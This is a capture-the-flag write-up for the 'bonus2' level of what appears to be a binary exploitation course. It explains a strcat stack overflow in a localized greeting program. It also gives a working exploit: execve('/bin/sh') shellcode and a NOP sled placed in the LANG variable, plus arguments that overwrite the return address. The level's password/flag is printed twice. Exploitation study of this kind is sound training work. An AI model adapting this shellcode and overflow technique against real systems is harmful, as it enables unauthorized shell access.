# Bonus2 - Localized Greeting Buffer Overflow

![Helldivers](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

## 📋 Binary Analysis

```c
int language = 0;

void greetuser(char *username)
{
	char greeting[64];

	if (language == 1)
		strcpy(greeting, "Hyvää päivää ");
	else if (language == 2)
		strcpy(greeting, "Goedemiddag! ");
	else if (language == 0)
		strcpy(greeting, "Hello ");
	
	strcat(greeting, username);  // ← Vulnerability: no bounds check!
	puts(greeting);
}

int main(int argc, char **argv)
{
	char buffer[72];
	char *lang_env;

	if (argc != 3)
		return (1);
	
	memset(buffer, 0, 72);
	strncpy(buffer, argv[1], 40);        // Copy up to 40 bytes
	strncpy(buffer + 40, argv[2], 32);   // Copy up to 32 bytes
	
	lang_env = getenv("LANG");
	if (lang_env != NULL)
	{
		if (memcmp(lang_env, "fi", 2) == 0)
			language = 1;                // Finnish
		else if (memcmp(lang_env, "nl", 2) == 0)
			language = 2;                // Dutch
	}
	
	greetuser(buffer);
	return (0);
}
```

## 🚨 Vulnerability

**Unchecked string concatenation with language-dependent overflow**

The program implements a localized greeting system using the `LANG` environment variable. The `greetuser()` function uses `strcat()` to concatenate a language-specific greeting with user-provided data **without any bounds checking**.

**Critical flaws:**
1. **`strcat()` has no length validation** - concatenates greeting + 72 bytes of user data into 64-byte buffer
2. **Language affects overflow distance** - longer greetings bring data closer to return address
3. **`strncpy()` doesn't guarantee null termination** - when source is exactly max length, no null byte is added
4. **Continuous buffer read** - without null terminator, `strcat()` reads argv[1] and argv[2] as one continuous string

**Overflow calculation:**
```
English:  "Hello " (6 bytes)  + 72 bytes = 78 total → 14-byte overflow
Finnish:  "Hyvää päivää " (13 bytes) + 72 bytes = 85 total → 21-byte overflow ✓ (Optimal)
Dutch:    "Goedemiddag! " (14 bytes) + 72 bytes = 86 total → 22-byte overflow
```

Finnish provides the perfect overflow distance to reach the return address with our 72-byte payload (40 + 32 from argv).

## 🎯 How the Exploit Works

### Conceptual Understanding

This exploit combines **environment variable manipulation** with **buffer overflow** to achieve code execution. The clever twist is storing the shellcode in the same environment variable that controls the greeting language.

**Attack vector:**
1. **Embed shellcode in LANG variable** → `LANG=fi<NOP_sled><shellcode>`
2. **Trigger Finnish greeting** → Program reads "fi", sets language = 1
3. **Overflow via strcat** → Greeting + 72 bytes overwrites return address
4. **Return to LANG shellcode** → EIP jumps to NOP sled in LANG variable

### Memory Layout - greetuser() Stack Frame

```
                 greetuser() Stack Frame
┌─────────────────────────────────────────────────┐
│  greeting[64] buffer       [EBP-64 to EBP-1]   │
│  ┌──────────────────────────────────────────┐   │
│  │ "Hyvää päivää " (13 bytes)              │   │ ← strcpy() writes greeting
│  │ [OVERFLOW STARTS HERE]                   │   │
│  │ argv[1]: AAAA... (40 bytes)             │   │ ← strcat() appends
│  │ argv[2]: BBBB... (18 bytes padding)     │   │
│  └──────────────────────────────────────────┘   │
├─────────────────────────────────────────────────┤ ← [EBP+0] Saved EBP
│  BBB (3 bytes from argv[2], overflow)          │   (partially overwritten)
├─────────────────────────────────────────────────┤ ← [EBP+4] Return Address
│  \xe8\xfe\xff\xbf  ← EIP                       │   Points to LANG NOP sled
└─────────────────────────────────────────────────┘
```

### LANG Environment Variable Layout

```
LANG environment variable in memory:

0xbffffeb9: ┌────────────────────────────────────────┐
            │ "LANG=" (5 bytes)                      │
0xbffffebe: ├────────────────────────────────────────┤
            │ "fi" (2 bytes)  ← Language identifier  │
0xbffffec0: ├────────────────────────────────────────┤
            │ \x90 \x90 \x90 \x90 \x90 \x90...      │
            │ NOP sled (100 bytes)                   │ ← Landing zone
0xbffffee8: │ ← Target address (40 bytes in)        │
            │ \x90 \x90 \x90 \x90 \x90 \x90...      │
0xbfffff24: ├────────────────────────────────────────┤
            │ \x31\xc0\x50\x68\x2f\x2f\x73\x68...   │
            │ Shellcode (21 bytes)                   │ ← execve("/bin/sh")
            └────────────────────────────────────────┘
```

### Attack Strategy Breakdown

#### Phase 1: Environment Setup
```bash
export LANG=$(python -c 'print("fi" + "\x90"*100 + "<shellcode>")')
```

**What this does:**
- Sets `LANG=fi` → triggers Finnish greeting (13 bytes)
- Embeds 100-byte NOP sled after "fi"
- Appends 21-byte execve shellcode at the end
- Creates large landing zone for imprecise return address

#### Phase 2: Buffer Construction in main()

```
main() creates 72-byte buffer:

Offset  Content                     Source
──────────────────────────────────────────────
0-39    AAAA... (40 bytes)          argv[1]
40-71   BBBB...B + address (32)     argv[2]
```

**No null terminator** after argv[1] when it fills all 40 bytes → `strcat()` reads continuously through both!

#### Phase 3: Overflow Execution Flow

```
1. greetuser() allocates 64-byte greeting buffer
2. strcpy(greeting, "Hyvää päivää ")  → 13 bytes written
3. strcat(greeting, buffer)           → Concatenates 72 more bytes!
   
   Total: 13 + 72 = 85 bytes written to 64-byte buffer
   Overflow: 21 bytes beyond buffer end
   
4. Stack corruption:
   - Bytes 0-12:   Greeting "Hyvää päivää "
   - Bytes 13-52:  argv[1] "A"*40
   - Bytes 53-70:  argv[2][:18] "B"*18
   - Bytes 71-74:  Overwrite saved EBP (don't care)
   - Bytes 75-78:  Overwrite return address → 0xbffffee8
   
5. greetuser() returns → EIP = 0xbffffee8
6. CPU jumps to 0xbffffee8 (middle of NOP sled in LANG)
7. NOP sled executes → slides into shellcode
8. Shellcode executes → execve("/bin/sh")
```

### Why This Works

| Requirement | Implementation | Result |
|-------------|----------------|---------|
| **Need shellcode location** | Store in LANG environment variable | Predictable address in high memory |
| **Need language trigger** | LANG starts with "fi" | Finnish greeting used |
| **Need large buffer** | 40 + 32 bytes from argv[1] + argv[2] | Enough to reach return address |
| **Need precise address** | 100-byte NOP sled in LANG | Any address in range works |
| **Need continuous data** | No null in argv[1] | strcat() reads through both args |
| **Need overflow** | Finnish greeting (13 bytes) + 72 = 85 | 21-byte overflow reaches EIP |

### Key Insight

**Evolution from bonus0:** In bonus0, we used a separate `SHELLCODE` environment variable. Bonus2 takes this further by **dual-purposing the LANG variable** - it both controls program behavior (selecting Finnish greeting) and stores the exploit payload. This demonstrates how environment variables can be weaponized when programs trust their contents.

The clever trick is that `getenv("LANG")` only reads the first two characters ("fi") to set the language, but the rest of the variable (NOP sled + shellcode) remains in memory, accessible via the environment pointer.

## 💣 Execute the Exploit

```bash
# Set up LANG with embedded shellcode (Finnish + NOP sled + shellcode)
export LANG=$(python -c 'print("fi" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')

# Execute the exploit
# argv[1]: 40 bytes padding (fills buffer, no null terminator)
# argv[2]: 18 bytes padding + return address (0xbffffee8 in little-endian)
./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\xe8\xfe\xff\xbf"')
```

**Expected output:**
```
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

**Address calculation notes:**
- Find LANG address in GDB: `x/20s *((char**)environ)`
- LANG typically at `~0xbffffeb9`
- NOP sled starts at LANG + 7 bytes (`0xbffffec0`)
- Target 40 bytes into NOP sled: `0xbffffec0 + 40 = 0xbffffee8`

> 💡 **Pro Tip**: The 100-byte NOP sled provides a huge landing zone - any address from `0xbffffec0` to `0xbfffff24` will work!

> ⚠️ **Security Note**: Modern systems use [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) to randomize environment variable addresses, making this exploit unreliable. Additionally, [stack canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries) would detect the stack corruption before the return.

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
